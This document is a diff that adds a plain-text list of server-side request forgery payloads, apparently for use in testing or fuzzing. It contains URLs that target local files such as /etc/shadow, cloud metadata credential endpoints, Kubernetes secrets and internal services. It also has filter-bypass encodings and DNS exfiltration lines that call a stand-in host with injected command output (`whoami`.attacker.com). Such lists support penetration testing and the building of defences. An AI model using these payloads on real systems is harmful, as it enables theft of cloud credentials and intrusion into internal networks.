@@ -1,0 +1,134 @@
+# Server-Side Request Forgery (SSRF)
+# Local file access via file:// protocol
+file:///etc/passwd
+file:///etc/shadow
+file:///proc/self/environ
+file:///var/www/html/config.php
+file://localhost/etc/passwd
+file:///C:/windows/win.ini
+
+# Localhost variations
+http://localhost/admin
+http://127.0.0.1/admin
+http://127.0.0.1:8080/admin
+http://[::1]/admin
+http://0.0.0.0/admin
+http://0/admin
+
+# Internal IP ranges
+http://192.168.1.1/admin
+http://192.168.0.1/admin
+http://10.0.0.1/admin
+http://172.16.0.1/admin
+http://169.254.169.254/latest/meta-data/ (AWS metadata)
+
+# AWS metadata service
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://169.254.169.254/latest/user-data
+http://169.254.169.254/latest/dynamic/instance-identity/document
+
+# GCP metadata service
+http://metadata.google.internal/computeMetadata/v1/
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity
+
+# Azure metadata service
+http://169.254.169.254/metadata/instance?api-version=2021-02-01
+
+# Docker metadata
+http://127.0.0.1:2375/v1.40/containers/json
+
+# Kubernetes service account
+http://kubernetes.default.svc/api/v1/namespaces/default/secrets
+
+# Local services
+http://localhost:22/ (SSH)
+http://localhost:3306/ (MySQL)
+http://localhost:5432/ (PostgreSQL)
+http://localhost:6379/ (Redis)
+http://localhost:27017/ (MongoDB)
+http://localhost:9200/ (Elasticsearch)
+http://localhost:8080/ (Common app port)
+http://localhost:9000/ (XDebug)
+http://localhost:11211/ (Memcached)
+
+# Encoding bypass
+http://127.0.0.1%00.attacker.com/admin
+http://127.0.0.1@attacker.com/admin
+http://127.0.0.1#attacker.com/admin
+http://attacker.com@127.0.0.1/admin
+
+# Hex encoding
+http://0x7f.0x0.0x0.0x1/admin
+http://0x7f000001/admin
+http://2130706433/admin (decimal)
+
+# Bypass via DNS rebinding
+http://attacker.com/ (resolves to internal IP)
+http://internal-service.local/
+
+# Redirect-based SSRF
+Attacker server redirects to http://localhost/admin
+
+# Data exfiltration via DNS
+http://EXFILTRATED_DATA.attacker.com/
+http://`whoami`.attacker.com/
+
+# FTP access
+ftp://attacker.com/
+ftp://127.0.0.1/
+ftp://username:password@127.0.0.1/
+
+# DICT protocol
+dict://127.0.0.1:11211/
+dict://127.0.0.1:22/
+
+# LDAP injection
+ldap://127.0.0.1:389/
+ldap://internal-ldap/ou=users,dc=internal,dc=com
+
+# Gopher protocol
+gopher://127.0.0.1:25/ (SMTP)
+gopher://127.0.0.1:6379/ (Redis)
+
+# URL fragment bypass
+http://attacker.com/#http://127.0.0.1/admin
+http://127.0.0.1/%23@attacker.com/admin
+
+# Case variation
+HTTP://127.0.0.1/admin
+HtTp://127.0.0.1/admin
+hTTp://127.0.0.1/admin
+
+# Null byte bypass
+http://127.0.0.1%00.attacker.com/admin
+http://127.0.0.1\x00.attacker.com/admin
+
+# Unicode bypass
+http://127。0。0。1/ (Chinese periods)
+http://127。0。0。1:80/
+
+# Port bypass
+http://127.0.0.1:80@attacker.com/admin
+http://attacker.com:80@127.0.0.1/admin
+
+# Whitespace bypass
+http://127.0.0.1 /admin
+http://127.0.0.1	/admin (tab)
+
+# URL scheme bypass
+/admin (relative)
+//127.0.0.1/admin
+///127.0.0.1/admin
+
+# Cloud metadata via SSRF
+http://metadata.service.consul/v1/kv/app/config
+http://vault.service.consul/v1/auth/token/lookup-self
+
+# Jenkins SSRF
+http://127.0.0.1:8080/script
+http://127.0.0.1:8080/pluginManager/plugins
+
+# Webhook SSRF
+http://127.0.0.1/callback
+http://127.0.0.1/webhook
